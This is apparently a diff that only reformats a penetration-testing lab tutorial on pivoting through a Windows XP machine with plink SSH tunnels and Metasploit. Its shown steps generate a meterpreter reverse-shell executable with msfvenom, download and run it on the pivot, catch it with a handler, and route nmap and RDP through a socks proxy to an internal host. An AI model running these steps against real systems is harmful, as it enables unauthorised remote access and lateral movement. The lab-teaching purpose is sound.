@@ -41,7 +41,7 @@ We connect to the Windows XP machine using “rdesktop” on the Kali Box. We do
 	
   1. Connect to the Windows XP machine from your Kali Box: rdesktop 192.168.1.30
   2. Download “plink.exe” from the Kali box to the Windows XP machine
-(plink.exe can be found on Kali -> “/usr/share/windows-binaries/plink.exe “-> Copy “plink.exe” to you web server root and start apache on Kali.Now you can download “plink.exe” on the Windows XP machine)
+(plink.exe can be found on Kali -> “/usr/share/windows-binaries/plink.exe “-> Copy “plink.exe” to you web server root and start apache on Kali. Now you can download “plink.exe” on the Windows XP machine)
   3. Open a command prompt on the Windows XP machine and navigate to the place where you have saved “plink.exe”
   4. Start SSH Daemon on Kali-Box. /etc/init.d/ssh start
   5. Run the following command on the Windows XP machine:
@@ -65,14 +65,20 @@ plink 192.168.1.16 -P 22 -> Tunnel the traffic using SSH on Kali-Box 192.168.1.1
 #### Scenario 2 (Local Port Forwarding):
 We want to connect to our Windows XP machine using Remote Desktop Protocol (RDP). The Port is 3389.
 There is an Inbound Firewall rule that blocks connections to this port. Let´s pretend that we are not able to change the firewall settings.
+
 (Create a specific rule on the XP machine or just imagine that RDP is not reachable on Port 3389)
 The problem is: We still want RDP connection!
+
 We simply redirect the local port 3389 ,let´s say, to port 3390.
+
 On the Windows XP machine:  plink 192.168.1.16 -P 22 -C -L 192.168.1.30:3390:192.168.1.30:3389
 (-L -> Local Port Forwarding)
+
 Read the command backward to understand what is going on:
+
 On the Kali Box:
 rdesktop 192.168.1.30:3390 -> Voila, there is our Remote Desktop Session!
+
 Sweet!
 
 
@@ -81,14 +87,14 @@ You are familiar with the concepts of local and remote port forwarding from Scen
 Now let’s do some Hacking!
 We want to Nmap the server on 10.0.0.10 from our attacking Kali-Box. Let´s attack the pivot machine to get a meterpreter shell from it.
 (Generate a standalone executable meterpreter reverse shell (.exe file) on your Kali box, execute it on the pivot and catch it on Kali using Metasploit)
-  1. Generate a Stand-Alone meterpreter executable:
+1. Generate a Stand-Alone meterpreter executable:
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.16 LPORT=443 -f exe -o meterpreter.exe
 
-  2. Copy meterpreter.exe to Kalis webroot
+2. Copy meterpreter.exe to Kalis webroot
   
-  3. Download meterpreter.exe to the XP machine
+3. Download meterpreter.exe to the XP machine
   
-  4. Setup the listener on the Kali Box:
+4. Setup the listener on the Kali Box:
     * msfconsole
     * use exploit/multi/handler
     * set PAYLOAD windows/meterpreter/reverse_tcp
@@ -96,42 +102,45 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.16 LPORT=443 -f exe 
     * set LPORT 443
     * exploit
   
-  5. Double-Click on meterpreter.exe and run it on the XP Machine
+5. Double-Click on meterpreter.exe and run it on the XP Machine
   
-  6. Now you have the meterpreter connection from the XP Machine on your Kali Box!
+6. Now you have the meterpreter connection from the XP Machine on your Kali Box!
   
-  7. Type “ifconfig” and see that this host is a dual homed machine.
+7. Type “ifconfig” and see that this host is a dual homed machine.
   
-  8. Type “background” to background the session
+8. Type “background” to background the session
   
-  9. Now we have to add a route to our metasploit session 1:
+9. Now we have to add a route to our metasploit session 1:
 route add 10.0.0.0 255.0.0.0 1
 (1 is the session number in metasploit)
   
-  10. Verify that the route was added successfully:
+10. Verify that the route was added successfully:
 route print
   
-  11. Now configure socks proxy in metasploit and start it:
-* use auxiliary/server/socks4a
-* set SRVHOST 127.0.0.1
-* run
+11. Now configure socks proxy in metasploit and start it:
+    * use auxiliary/server/socks4a
+    * set SRVHOST 127.0.0.1
+    * run
 (You can use default settings for SRVHOST 0.0.0.0 as well. The port is important. Default is Port 1080)
   
-  12. Configure proxy chains on the Kali Box:
-* vi /etc/proxychains.conf
+12. Configure proxy chains on the Kali Box:
+    * vi /etc/proxychains.conf
 Edit the ProxyList at the bottom of the file:
-* socks4   127.0.0.1   1080
+    * socks4   127.0.0.1   1080
 The configuration has to be the same as in metasploit
   
-  13. Run you nmap scan using proxychains:
+13. Run you nmap scan using proxychains:
 Some Tips:
-You should use the options -Pn (assume that host is up) and -sT (TCP connect scan) with nmap through proxychains! Using other scan types, TCP Syn scan for example, will not work!
+You should use the options -Pn (assume that host is up) and -sT (TCP connect scan) with nmap through proxychains! 
+Using other scan types, TCP Syn scan for example, will not work!
+
 proxychains nmap -Pn -sT -p445,3389 10.0.0.10
 (These two ports should be opened. If you see “denied” in the nmap result something went wrong with the proxy configuration or the route was added in the meterpreter session. 
+
 Background the meterpreter session and then add the route in metasploit for the meterpreter Session! See Steps 9-11)
   
-  14. Get Remote Desktop
-proxychains rdesktop 10.0.0.10
+14. Get Remote Desktop
+    * proxychains rdesktop 10.0.0.10
   
-  15. Surf to 10.0.0.10
-proxychains firefox 10.0.0.10
+15. Surf to 10.0.0.10
+    * proxychains firefox 10.0.0.10
